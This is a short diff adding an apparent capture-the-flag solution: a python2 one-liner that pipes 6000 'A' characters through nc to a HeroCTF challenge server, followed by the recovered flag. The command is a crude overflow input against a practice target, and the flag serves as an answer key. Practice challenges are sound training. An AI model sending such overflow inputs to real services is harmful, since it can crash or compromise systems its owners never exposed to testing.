@@ -1,0 +1,3 @@
+python2 -c 'print "A"*6000' | nc challs.heroctf.fr 7000
+
+Hero{W0w_wh4t_4_n1c3_j0b!!}
